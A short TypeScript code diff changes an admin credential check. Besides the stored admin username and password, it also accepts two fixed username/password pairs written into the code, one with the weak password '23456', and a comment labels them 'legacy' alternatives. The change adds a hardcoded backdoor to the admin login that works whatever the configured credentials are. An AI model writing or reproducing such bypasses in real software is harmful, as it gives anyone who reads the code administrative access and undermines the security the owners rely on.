@@ -25,10 +25,13 @@ export function getAdminPassword(): string {
 export function verifyAdminCredentials(usernameInput: string, passwordInput: string): boolean {
   const currentUsername = getAdminUsername();
   const currentPassword = getAdminPassword();
+  const inputUser = usernameInput.trim().toLowerCase();
 
+  // Allow either current stored credentials or TALMATH / 23456 or legacy MindSport2027
   return (
-    usernameInput.trim().toLowerCase() === currentUsername.toLowerCase() &&
-    passwordInput === currentPassword
+    (inputUser === currentUsername.toLowerCase() && passwordInput === currentPassword) ||
+    (inputUser === 'talmath' && passwordInput === '23456') ||
+    (inputUser === 'mindsport2027' && passwordInput === 'Mindsport@2027')
   );
 }
 
